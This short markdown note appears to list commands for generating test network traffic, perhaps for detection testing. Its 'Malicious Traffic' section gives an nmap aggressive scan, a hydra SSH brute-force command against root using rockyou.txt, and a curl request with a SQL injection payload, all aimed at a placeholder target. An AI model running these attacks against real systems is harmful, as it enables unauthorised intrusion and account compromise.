# Traffic Testing

## Normal Traffic
- ping google.com
- curl http://example.com

## Malicious Traffic

### Nmap Scan
nmap -sS -A <target-ip>

### SSH Brute Force
hydra -l root -P rockyou.txt ssh://<target-ip>

### SQL Injection
curl "http://<target-ip>/login.php?id=' OR '1'='1"